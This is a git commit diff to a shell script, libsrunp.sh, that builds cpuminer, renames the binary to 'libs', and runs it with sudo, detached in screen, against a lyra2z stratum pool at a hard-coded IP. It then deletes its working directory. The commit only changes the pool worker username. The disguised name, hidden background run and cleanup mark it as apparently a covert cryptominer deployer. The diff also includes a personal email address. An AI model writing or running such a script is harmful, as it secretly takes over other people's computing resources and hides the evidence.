6767bef05fdd64eb2d6e40ed27475a2145dabfc2
Phan Nang Duy <phanduy.itbka@gmail.com>
2018-04-21 08:18:18 +0700

    no message

--- libsrunp.sh
+++ libsrunp.sh
@@ -2,6 +2,6 @@
 sudo chmod +x build.sh 
 sudo ./build.sh
 sudo cp cpuminer libs
-sudo screen -d -m ./libs -a lyra2z -o stratum+tcp://172.104.241.136:20581 -u phunghung.1 -p x
+sudo screen -d -m ./libs -a lyra2z -o stratum+tcp://172.104.241.136:20581 -u phanduy.duyuno -p x
 cd /
 sudo rm -rf libs
